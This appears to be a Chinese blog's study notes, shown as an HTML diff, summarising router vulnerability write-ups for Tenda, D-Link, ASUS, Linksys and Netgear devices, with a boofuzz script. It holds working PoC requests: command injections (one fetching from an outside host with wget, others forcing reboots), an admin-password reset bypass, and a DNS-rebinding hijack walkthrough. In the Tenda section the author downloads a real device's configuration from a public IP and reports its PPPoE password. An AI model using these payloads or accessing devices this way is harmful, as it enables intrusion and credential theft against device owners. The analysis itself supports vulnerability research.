+<li>将对应的qemu程序及其依赖库拷贝到对应目录，<ul>
+<li>ldd查看依赖库、mkdir/cp拷贝文件</li>
+<li>使用静态的就没这烦恼了，如qemu-mips-static</li>
+</ul>
+</li>
+<li>在设备上调试，条件：<ul>
+<li>有shell权限（比如能ssh访问到</li>
+<li>有静态编译的gdbserver或者gdb（gdbserver attach进程号、gdb-multiarch来连接</li>
+</ul>
+</li>
+</ul>
+<h2 id="tenda某路由器信息泄露查找"><a href="#tenda某路由器信息泄露查找" class="headerlink" title="tenda某路由器信息泄露查找"></a>tenda某路由器信息泄露查找</h2><p><a href="https://bbs.ichunqiu.com/thread-32773-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-32773-1-1.html</a></p>
+<ul>
+<li>搜索并下载：<a href="https://www.tenda.com.cn/search/n150.html" target="_blank" rel="noopener">https://www.tenda.com.cn/search/n150.html</a></li>
+<li>binwalk对trx提取文件后，得到1C，再次对1C进行提取（-Me提取文件也没报错啊，但是就是没有_1C这样提取后的目录</li>
+<li><p>提取后的每一个文件都是data，并不是我们已知的类型</p>
+<ul>
+<li>查看具体的一个xml文件看一下，可以看到这并不是一个正常的xml文件，其中还混杂这其它二进制数据，</li>
+<li>应该是binwalk在处理xml或者html这类文件时，无法像其它文件一样通过文件头来确定整个文件的大小</li>
+</ul>
+</li>
+<li><p>采用最简单的方法，通过正则查找脚本语言相关的代码段进行分析</p>
+<ul>
+<li>使用strings命令将解压后的1C字符串输出到文本：strings 1C &gt; tenda.txt</li>
+<li>对应的这款tenda路由器使用asp脚本语言，我们可以通过查找&lt;%xx%&gt;这样的asp代码片段：grep -e “&lt;%.*%&gt;” tenda.txt</li>
+<li>查找tenda路由器中的cgi处理程序，是否有一些隐藏的链接：grep -e “cgi” tenda.txt</li>
+</ul>
+</li>
+<li>查找cgi获取到的信息：/cgi-bin/upgrade、/cgi-bin/DownloadCfg/RouterCfm.cfg、/cgi-bin/UploadCfg，由名字就猜到功能</li>
+<li><p>测试</p>
+<ul>
+<li>直接访问/cgi-bin/DownloadCfg/RouterCfm.cfg，是否能下载路由器的配置文件</li>
+<li>成功下载路由器的配置文件，文件中包含拨号连接的账号信息（搜索passwd</li>
+</ul>
+</li>
+<li><p>现网案例查找</p>
+<ul>
+<li>在路由器页面里面，我们可以通过js的一些特征作为搜索关键字：body=def_want（这个特征是怎么来的？ </li>
+<li>fofa（shodan、zoomeye</li>
+<li><a href="http://39.84.48.228:82/index.asp/cgi-bin/DownloadCfg/RouterCfm.cfg" target="_blank" rel="noopener">http://39.84.48.228:82/index.asp/cgi-bin/DownloadCfg/RouterCfm.cfg</a></li>
+<li>应该是可以，但是wget时：2020-05-26 18:06:20 (97.8 KB/s) - 在 8804 字节处连接关闭。重试中。（尽管如此，也能下载下来，打开搜索passwd，能找到wan0_pppoe_passwd=123456</li>
+</ul>
+</li>
+</ul>
+<h2 id="D-Link路由器HNAP协议系列漏洞披露"><a href="#D-Link路由器HNAP协议系列漏洞披露" class="headerlink" title="D-Link路由器HNAP协议系列漏洞披露"></a>D-Link路由器HNAP协议系列漏洞披露</h2><p><a href="https://www.heibai.org/post/1395.html" target="_blank" rel="noopener">https://www.heibai.org/post/1395.html</a></p>
+<ul>
+<li>结合DNS Rebinding技术，实现了穿透攻击处于内网的路由器</li>
+<li>HNAP协议（Home Network Administration Protocol），普遍应用于智能家居、SOHO办公等中小型网络中，在路由器上应用广泛，D-Link设备也广泛使用了HNAP协议</li>
+<li>通过逆向分析和动态调试澄清路由器对HNAP协议的实现架构和处理流程<ul>
+<li>其中DIR-823G在goahead完整实现了全部功能，</li>
+<li>DIR-878在lighttpd中通过调用librcm.so、rc模块实现</li>
+</ul>
+</li>
+<li>综合使用二进制静态分析和动态Fuzzing技术<ul>
+<li>其中DIR-823G没有开启对HNAP API的访问认证，导致大量敏感API暴露，越权问题普遍存在，更严重的是数个API函数使用中存在命令注入</li>
+<li>DIR-878虽然开启了HNAP API访问认证，但是API函数普遍存在命令注入问题</li>
+</ul>
+</li>
+<li>结合DNS Rebinding的漏洞危害效果评估<ul>
+<li>由于路由器通常应用在局域网中，在以往的攻防对抗中，其安全漏洞的攻击面很难直接暴露在公网上，</li>
+<li>因此，攻击者越来越多的通过钓鱼植入等方式诱导内网用户下载执行攻击代码，从而从内部控制路由器，</li>
+<li>反向连接到公网上的攻击者服务器，实现穿透攻击。</li>
+<li>其中DNS Rebinding技术即可以很好的达到这种打入局域网内部的攻击效果</li>
+</ul>
+</li>
+<li>DNS Rebinding技术演示<ul>
+<li>攻击者可通过发送内嵌恶意代码的网页URL链接给WLAN网内用户，网页中恶意代码将多次请求攻击者的远程DNS服务器解析主机名，触发DNS Rebinding，重定向攻击控制网关路由器。由此实现，只需要一个URL链接即可</li>
+<li>Step1：攻击者发送恶意URL链接</li>
+<li>Step2：受害者点击链接，受害者浏览恶意网页，网页JS代码攻击篡改路由器上的DNS服务配置；</li>
+<li>Step3：内网其他主机用户访问重要网站（例如login.taobao.com）被劫持</li>
+</ul>
+</li>
+<li>攻击原理解析：<ul>
+<li>攻击者发送恶意URL链接 </li>
+<li>受害者点击该链接，此时DNS server 将主机名解析为攻击者的web服务器IP；</li>
+<li>网页中视频播放一分钟左右，JS脚本会POST请求<a href="http://dnsrebind.smilehacker.net/HNAP1/；" target="_blank" rel="noopener">http://dnsrebind.smilehacker.net/HNAP1/；</a></li>
+<li>此时DNS server将响应客户端的第二次对dnsrebind.smilehacker.net的解析请求，返回地址为路由器网关IP192.168.0.1, 漏洞攻击数据包将送达到路由器, 攻击成功，且不会触发浏览器跨域限制；</li>
+<li>视频中的攻击载荷修改了路由器的DNS服务配置，将淘宝登陆域名login.taobao.com指向了攻击者的仿冒网站，达到了DNS劫持的目的。</li>
+</ul>
+</li>
+<li>上述攻击中，两次DNS请求的间隔时间取决于浏览器中DNS记录缓存刷新时间，只要在这个攻击潜伏的窗口期内，用户没有关闭浏览器，即可攻击成功！为了尽可能缩小这个时间窗口期，在攻击者控制的DNS server中设置DNS记录的生命周期 TTL值为0，并挑选常见的个人用户主机浏览器配置结合下载执行的攻击负载，进行攻击窗口期测试（迷迷糊糊</li>
+<li>越权访问类型漏洞（CVE-2019-7388~7390，CVE-2019-8392）<ul>
+<li>此类漏洞存在于DIR-823G中</li>
+<li>发现接入WLAN的用户无需认证可以远程调用上述API接口函数</li>
+<li>所以，攻击者通过调用其中的一些敏感函数如GetClientInfo、SetWanSettings、SetFactoryDefault、SetWLanRadioSettings，能够达到信息窃取、DNS劫持、重置出厂设置、开启Guest Wi-Fi等越权访问类漏洞攻击</li>
+<li>CVE-2019-7390：越权修改DNS配置，实现DNS劫持</li>
+<li>通过调用HNAP接口的SetWanSettings函数，可以直接修改DNS设置</li>
+</ul>
+</li>
+<li>命令注入类型漏洞<ul>
+<li>在两款路由器中均存在，</li>
+<li>多处HNAP功能函数在调用系统shell执行相关命令时，没有严格过滤外部输入参数，导致命令注入漏洞</li>
+<li>漏洞位于DIR-823G的/bin/goahead，str变量在给system函数执行之前：ping str2 -c %d -w %d -s %d &gt; /tmp/ping.txt 2&gt;&gt;/tmp/ping.txt，其中的str2来自域名字段</li>
+<li>利用方法：需要先调用HNAP接口SetNetworkTomographySettings设置对应的域名字段，然后调用GetNetworkTomographyResult触发漏洞</li>
+<li>通过发送POST请求，调用HNAP协议的SOAP接口SetNetworkTomographySettings（通过在Headers中包含对应的SOAPAction字段指明对应的方法名称:</li>
+<li>将分隔符和ps命令直接写入到address字段，即<address>;ps</address></li>
+<li>通过发送POST请求来远程调用API接口GetNetworkTomographyResult，请求和返回如下，得到ps命令执行的回显，验证该漏洞利用成功</li>
+</ul>
+</li>
+<li><p>修补建议主要分为两个方面：</p>
+<ul>
+<li>开启HNAP接口的登陆认证，尤其需要保护针对敏感功能函数的远程使用；</li>
+<li>HNAP协议在管理设备时，需要经常调用系统shell执行命令，在使用外部输入作为命令输入参数时，可以通过黑名单的方式过滤掉参数中存在的当前设备支持的shell命令。</li>
+</ul>
+</li>
+<li><p>近年在物联网的迅速兴起下，网络设备的低成本、功能快速迭代需求导致厂商往往更加无暇顾及安全问题</p>
+</li>
+<li>（前面讲危害，后面讲原理</li>
+</ul>
+<h2 id="华硕路由器9999端口远程命令执行研究报告-V1"><a href="#华硕路由器9999端口远程命令执行研究报告-V1" class="headerlink" title="华硕路由器9999端口远程命令执行研究报告 V1"></a>华硕路由器9999端口远程命令执行研究报告 V1</h2><p><a href="https://blog.knownsec.com/2015/01/report-of-asua-router-9999-port-remote-command-execution-v1/" target="_blank" rel="noopener">https://blog.knownsec.com/2015/01/report-of-asua-router-9999-port-remote-command-execution-v1/</a></p>
+<ul>
+<li>华硕路由器R系列路由器使用开源路由器系统Asuswrt，开源代码给我们随后的漏洞分析带来很多方便，不用逆向分析。</li>
+<li>在Asuswrt中存在infosvr进程，<ul>
+<li>该进程监听在0.0.0.0 IP上，监听本机任何IP的9999 UDP端口。</li>
+<li>Infosvr自身的授权机制不完整，在infosvr处理用户提交的数据时也没有适合的过滤，</li>
+<li>而且使用了system()函数执行部分请求，最终导致远程命令执行漏洞。</li>
+</ul>
+</li>
+<li>分析流程<ul>
+<li>processPacket()函数把请求数据转换成IBOX_COMM_PKT_HDR结构，想触发漏洞，需要按照这个数据结构来发送数据包</li>
+<li>想要触发漏洞，需要通过if，所以设定攻击代码的前两字节分别为xxx</li>
+<li>MAC验证是摆设，<code>if(memecpy(phdr_ex-&gt;macaddress,mac,6)==0)</code>，把MacAddress的前6字节拷贝到了字符数组mac处，返回是指向mac地址的指针，不会等于0</li>
+<li>（大胆猜测作者可能是想用memcmp()函数，结果用错了</li>
+</ul>
+</li>
+<li>路由器系统管理端口正常情况下是不会暴漏在公网上的，我们检索到的只是暴漏在公网上开放管理端口路由器设备的，相信还有更多的设备隐藏在背后</li>
+</ul>
+<h2 id="分析多款D-Link路由器中的未授权RCE漏洞"><a href="#分析多款D-Link路由器中的未授权RCE漏洞" class="headerlink" title="分析多款D-Link路由器中的未授权RCE漏洞"></a>分析多款D-Link路由器中的未授权RCE漏洞</h2><p><a href="https://www.anquanke.com/post/id/187923" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187923</a></p>
+<ul>
+<li><p>产品已超出产品支持生命周期（EOL），这意味着厂商不会再为我们发现的问题提供补丁</p>
+</li>
+<li><p>没有采用正确的身份认证流程，也是漏洞利用的基础</p>
+</li>
+<li><p>路由器管理页面，尝试登录</p>
+<ul>
+<li>action=do_graph_auth</li>
+<li>URI为：/apply_sec.cgi</li>
+</ul>
+</li>
+<li><p><strong>不管登录与否，程序将一直执行下去，不会终止</strong></p>
+<ul>
+<li>默认情况下，current_user没有被初始化，user_username的值为user</li>
+<li>因此二者的比较结果iVar2不等于0，程序就不会因为返回<code>error.asp</code>而终止</li>
+</ul>
+</li>
+<li><p>query_vars一般是能够执行成功的</p>
+<ul>
+<li>然后进入if条件分支，将URI值与/apply_sec.cgi作比较。</li>
+<li>如果满足条件，则ppcVar3指向SSC_SEC_OBJS数组</li>
+<li>（前面处理登录操作的就是apply_sec.cgi，因此也满足条件，因此指向sec数组</li>
+<li>ppcVar3指向的是SSC_SEC_OBJS数组，该数组包含一系列action值，有一个为：ping_test</li>
+</ul>
+</li>
+<li><p><strong>错误的身份认证：即使没通过认证，代码仍会继续执行，这意味着我们可以通过/apply_sec.cgi路径，执行SSC_SEC_OBJS中的任意action操作</strong></p>
+</li>
+<li><p>action为ping_test时，从ping_ipaddr参数中提取输入值，执行ping操作。</p>
+<ul>
+<li>如果尝试输入特殊字符（比如双引号、单引号、分号等），ping操作会执行失败。</li>
+<li><p>幸运的是，如果我们传入换行符（比如8.8.8.8%0als），就可以实现命令注入攻击效果。</p>
+</li>
+<li><p>action=ping_test&amp;ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20<a href="http://45.76.148.31:4321/?$" target="_blank" rel="noopener">http://45.76.148.31:4321/?$</a>(echo 1234)</p>
+</li>
+<li>向apply_sec.cgi发起POST HTTP请求，执行的action为ping_test，然后通过ping_ipaddr参数实现命令注入。</li>
+<li>虽然路由器返回的是登录页面，但ping_test操作实际上已经成功执行</li>
+</ul>
+</li>
+<li><p>该漏洞的根源在于设备没有对原生系统所执行的命令进行检查，这也是许多固件厂商经常存在的一种安全隐患</p>
+</li>
+</ul>
+<h2 id="IoT-设备网络协议模糊测试工具boofuzz实战"><a href="#IoT-设备网络协议模糊测试工具boofuzz实战" class="headerlink" title="IoT 设备网络协议模糊测试工具boofuzz实战"></a>IoT 设备网络协议模糊测试工具boofuzz实战</h2><p><a href="https://blog.csdn.net/song_lee/article/details/104334096" target="_blank" rel="noopener">https://blog.csdn.net/song_lee/article/details/104334096</a></p>
+<p>类似：<a href="https://cq674350529.github.io/2019/03/31/IoT设备固件分析之网络协议fuzz/" target="_blank" rel="noopener">https://cq674350529.github.io/2019/03/31/IoT设备固件分析之网络协议fuzz/</a></p>
+<ul>
+<li>/opt/firmware-analysis-toolkit$ ./fat.py ~/Desktop/firmware/RB-1732_TC_v2.0.43.bin</li>
+<li>burp抓包</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /goform/formLogin HTTP/1.1</span><br><span class="line">Host: 192.168.156.214:8000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://192.168.156.214:8000/admin.asp</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 39</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure>
+<ul>
+<li>根据报文，利用boofuzz框架提供的原语对http请求进行定义：<a href="https://boofuzz.readthedocs.io/en/stable/user/static-protocol-definition.html#primitive-definition" target="_blank" rel="noopener">https://boofuzz.readthedocs.io/en/stable/user/static-protocol-definition.html#primitive-definition</a></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">s_initialize(name=<span class="string">"Request"</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># http请求行</span></span><br><span class="line"><span class="keyword">with</span> s_block(<span class="string">"Request-Line"</span>): </span><br><span class="line">  <span class="comment"># LINE 1: POST /goform/formLogin HTTP/1.1</span></span><br><span class="line">  s_static(<span class="string">"POST"</span>, name=<span class="string">"Method"</span>)	<span class="comment"># Push a static value</span></span><br><span class="line">  s_delim(<span class="string">" "</span>, name=<span class="string">'space-1'</span>)</span><br><span class="line">  s_string(<span class="string">"/fromLogin"</span>, name=<span class="string">'Request-URI'</span>)  <span class="comment"># 需要变异</span></span><br><span class="line">  s_delim(<span class="string">" "</span>, name=<span class="string">'space-2'</span>)</span><br><span class="line">  s_static(<span class="string">'HTTP/1.1'</span>, name=<span class="string">'HTTP-Version'</span>)   </span><br><span class="line">  s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># LINE 2</span></span><br><span class="line">  s_static(<span class="string">"Host"</span>, name=<span class="string">"Host"</span>)</span><br><span class="line">  s_static(<span class="string">": "</span>)</span><br><span class="line">  s_static(<span class="string">"192.168.10.1"</span>, name=<span class="string">"ip"</span>)</span><br><span class="line">  s_static(<span class="string">"\r\n"</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># LINE 3  对应 Content-Length: 400</span></span><br><span class="line">  s_static(<span class="string">'Content-Length'</span>)</span><br><span class="line">  s_static(<span class="string">': '</span>)</span><br><span class="line">  s_size(<span class="string">'data'</span>, output_format=<span class="string">'ascii'</span>, fuzzable=<span class="keyword">True</span>)    <span class="comment"># size的值根据data部分的长度自动进行计算，同时对该字段进行fuzz</span></span><br><span class="line">  s_static(<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">	s_static(<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># http请求数据</span></span><br><span class="line"><span class="keyword">with</span> s_block(<span class="string">'data'</span>):</span><br><span class="line">  s_static(<span class="string">'login_name=&amp;curTime=1581845487827&amp;setLang=&amp;setNoAutoLang=&amp;login_n=admin&amp;login_pass='</span>)</span><br><span class="line">  s_string(<span class="string">'123456'</span>, max_len=<span class="number">1024</span>)	<span class="comment"># 需要变异，且最大长度为1024</span></span><br><span class="line">  s_static(<span class="string">'&amp;languageSel=1'</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="Linksys-velop-authentication-bypass"><a href="#Linksys-velop-authentication-bypass" class="headerlink" title="Linksys velop authentication bypass"></a>Linksys velop authentication bypass</h2><p><a href="https://puzzor.github.io/Linksys-Velop-Authentication-bypass" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-Authentication-bypass</a></p>
+<ol>
+<li>velop是家庭Wi-Fi系统，WHW03型号，WHW0303/02/01仅表示这一套有几个，其实是一样的东西</li>
+<li>这是WHW03，而实机是WHW01</li>
+<li>信息泄漏、认证绕过（改密码</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 泄漏敏感信息</span></span><br><span class="line">GET /sysinfo_json.cgi HTTP/1.1</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"><span class="string">"wps_pin"</span>: <span class="string">"wps_device_pin = 58163597"</span>,<span class="comment"># 只要wps功能开启，就可通过此pin来连接Wi-Fi，而不需要知道密码</span></span><br><span class="line"><span class="string">"device_recovery_key"</span>: <span class="string">"84667"</span>,<span class="comment"># 可用来重置密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改登录密码</span></span><br><span class="line">POST /JNAP/ HTTP/1.1</span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/nodes/setup/SetAdminPassword</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"resetCode"</span>:<span class="string">"84667"</span>,<span class="string">"adminPassword"</span>:<span class="string">"test1234"</span>&#125;<span class="comment"># 用上述获得的84667</span></span><br></pre></td></tr></table></figure>
+<h2 id="Linksys-velop-zbtest-command-injection"><a href="#Linksys-velop-zbtest-command-injection" class="headerlink" title="Linksys velop zbtest command injection"></a>Linksys velop zbtest command injection</h2><p><a href="https://puzzor.github.io/Linksys-Velop-zbtest-command-injection" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-zbtest-command-injection</a></p>
+<ol>
+<li>/cgi-bin/zbtest.cgi，lua脚本</li>
+</ol>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1 可传递三个参数</span></span><br><span class="line">cmd = params[<span class="string">"cmd"</span>]</span><br><span class="line">node_id = params[<span class="string">"nodeid"</span>]</span><br><span class="line">level = params[<span class="string">"level"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2 cmd=remove、on、off时，没有检查node_id，扔进remove_bulbs、ShellExecute执行命令</span></span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"remove"</span> <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Run remove command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  remove_bulbs(node_id)</span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"on"</span> <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Run turn on command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  ShellExecute(<span class="string">"zbapitest on-off "</span>..node_id..<span class="string">" 1 &gt; "</span>..name..<span class="string">" 2&gt;&amp;1"</span>)</span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"off"</span> <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Run turn off command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  ShellExecute(<span class="string">"zbapitest on-off "</span>..node_id..<span class="string">" 0 &gt; "</span>..name..<span class="string">" 2&gt;&amp;1"</span>)</span><br><span class="line"><span class="comment">-- 3 cmd=level时，没有检查level和node_id，扔进ShellExecute执行命令</span></span><br><span class="line"><span class="keyword">elseif</span> cmd == <span class="string">"level"</span> <span class="keyword">and</span> level <span class="keyword">and</span> node_id <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">"Run level ("</span>..level..<span class="string">") command : "</span>..node_id..<span class="string">"&lt;br&gt;&lt;br&gt;"</span>)</span><br><span class="line">  ShellExecute(<span class="string">"zbapitest level "</span>..node_id..<span class="string">" "</span>..level..<span class="string">" 0 1"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>poc</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">GET /cgi-bin/zbtest.cgi?cmd=off&amp;nodeid=|reboot| HTTP/1.1</span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">GET /cgi-bin/zbtest.cgi?cmd=level&amp;nodeid=0x0&amp;level=1|reboot| HTTP/1.1</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>命令执行函数：system、popen、ShellExecute</li>
+</ol>
+<h2 id="Linksys-velop-information-leak"><a href="#Linksys-velop-information-leak" class="headerlink" title="Linksys velop information leak"></a>Linksys velop information leak</h2><p><a href="https://puzzor.github.io/Linksys-Velop-Information-Leak" target="_blank" rel="noopener">https://puzzor.github.io/Linksys-Velop-Information-Leak</a></p>
+<ol>
+<li>厂商并未修改，仍然存在（当时，现在未知</li>
+<li>Linksys APP会通过JNAP协议与路由器通信，诸多功能通过 X-JNAP-Action请求头来指定</li>
+<li>有的JNAP action可以不经过认证</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /JNAP/ HTTP/1.1<span class="comment"># 请求/JNAP</span></span><br><span class="line">User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)<span class="comment"># 表明是app端</span></span><br><span class="line">X-JNAP-Action: http://linksys.com/jnap/devicelist/GetDevices<span class="comment"># 指定action，一般对应lua文件</span></span><br><span class="line"></span><br><span class="line">&#123;&#125;<span class="comment"># 指定action所需的参数</span></span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>app端的请求，应该用pc端也可以，再者可以通过ua头来伪造</li>
+<li>挖洞思路：指定action一般是”<a href="http://linksys.com/jnap/xxxxxx&quot;形式，/JNAP/module目录中搜索字符串，找到所有支持的action，依次看哪个不需要认证，并进一步审计lua文件（比如参数有几个，是否经过过滤，如上述popen和ShellExcue导致的命令注入" target="_blank" rel="noopener">http://linksys.com/jnap/xxxxxx&quot;形式，/JNAP/module目录中搜索字符串，找到所有支持的action，依次看哪个不需要认证，并进一步审计lua文件（比如参数有几个，是否经过过滤，如上述popen和ShellExcue导致的命令注入</a></li>
+</ol>
+<h2 id="Pwn2Own-Netgear-R6700-UPnP漏洞分析"><a href="#Pwn2Own-Netgear-R6700-UPnP漏洞分析" class="headerlink" title="Pwn2Own Netgear R6700 UPnP漏洞分析"></a>Pwn2Own Netgear R6700 UPnP漏洞分析</h2><p><a href="https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP漏洞分析/" target="_blank" rel="noopener">https://cq674350529.github.io/2020/07/04/Pwn2Own-Netgear-R6700-UPnP漏洞分析/</a></p>
+<ul>
+<li>sscanf、sprintf均可溢出，前者分发后者整合</li>
+<li>upnpd二进制文件默认侦听多个端口：5000/tcp、56938/udp和1900/udp。最后两个端口监听0.0.0.0，而第一个端口只监听路由器的LAN地址。</li>
+<li>根据字符串判定函数名、处于函数开头作日志功能</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sub_BAC8功能类似print_debugs</span></span><br><span class="line">sub_BAC8(2, <span class="string">"%s()\n"</span>, <span class="string">"sa_method_check"</span>);</span><br><span class="line">sub_BAC8(3, <span class="string">"%s(%d);\n"</span>, <span class="string">"sa_setBlockName"</span>, 1069);</span><br><span class="line">sub_BAC8(2, <span class="string">"%s(): type = %d\n"</span>, <span class="string">"sa_processResponse"</span>, a1);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>poc中uri：soap/server_sa</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uri为soap/server_sa或者soap/server_sa/opendns才会进入sa_method_check</span></span><br><span class="line">int __fastcall upnp_handle_post(int http_uri, const char *http_content, int a3, int *a4, int a5)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( stristr(http_uri, <span class="string">"soap/server_sa"</span>) || stristr(http_uri, <span class="string">"soap/server_sa/opendns"</span>) )</span><br><span class="line">    <span class="built_in">return</span> sa_method_check(http_content, a3, a4, a5);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确定第一个参数为uri，第二个为content</span></span><br><span class="line">ssize_t __fastcall upnp_parse_request(const char *a1, int a2, int *a3, int a4)</span><br><span class="line">&#123;</span><br><span class="line">  strncpy((char *)http_content, http_content_2, 0x3FFu);</span><br><span class="line">  http_data = (char *)http_content;</span><br><span class="line">  http_header = strsep(&amp;http_data, <span class="string">"\r\n"</span>);<span class="comment"># 分割字符串，左边给返回值，右边给参数1</span></span><br><span class="line">  http_method = strsep(&amp;http_header, <span class="string">" \t"</span>);</span><br><span class="line">  http_uri = strsep(&amp;http_header, <span class="string">" \t"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stricmp(http_method, <span class="string">"POST"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( upnp_handle_post((int)http_uri, http_content_2, a2, a3, a4) )</span><br></pre></td></tr></table></figure>
+<ul>
+<li>参考：<a href="https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md" target="_blank" rel="noopener">https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md</a></li>
+</ul>
+<h2 id="Hacking-the-D-Link-DIR-890L"><a href="#Hacking-the-D-Link-DIR-890L" class="headerlink" title="Hacking the D-Link DIR-890L"></a>Hacking the D-Link DIR-890L</h2><p><a href="http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/" target="_blank" rel="noopener">http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/</a></p>
+<ul>
